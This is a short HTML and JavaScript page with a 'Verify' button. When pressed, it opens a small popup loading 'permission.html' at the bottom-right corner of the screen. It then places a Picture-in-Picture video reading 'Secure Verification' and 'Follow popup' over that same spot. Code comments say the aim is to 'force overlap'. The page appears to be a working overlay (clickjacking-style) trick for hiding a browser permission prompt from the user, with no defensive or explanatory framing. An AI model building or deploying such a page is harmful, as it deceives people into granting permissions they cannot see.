<!DOCTYPE html>
<html>
<body style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial;">

<button onclick="start()">Verify</button>
<video id="vid" playsinline muted></video>

<script>
async function start() {

  const video = document.getElementById("vid");

  // 🔥 Use slightly bigger size (PiP has padding)
  const width = 360;
  const height = 220;

  // 🔥 Aggressive bottom-right positioning (force overlap)
  const left = screen.availWidth - width - 10;
  const top = screen.availHeight - height - 10;

  const popup = window.open(
    "permission.html",
    "perm",
    `width=${width},height=${height},left=${left},top=${top}`
  );

  const canvas = document.createElement("canvas");
  canvas.width = 320;
  canvas.height = 180;
  const ctx = canvas.getContext("2d");

  function loop() {
    ctx.fillStyle = "#fff";
    ctx.fillRect(0, 0, 320, 180);

    ctx.fillStyle = "#000";
    ctx.font = "16px Arial";
    ctx.fillText("Secure Verification", 60, 70);
    ctx.fillText("Follow popup", 80, 100);

    requestAnimationFrame(loop);
  }
  loop();

  const stream = canvas.captureStream(30);
  video.srcObject = stream;

  // 🔥 Delay more for stable placement
  setTimeout(async () => {
    try {
      await video.play();
      await video.requestPictureInPicture();
    } catch (e) {
      console.log(e);
    }
  }, 400);
}
</script>

</body>
</html>
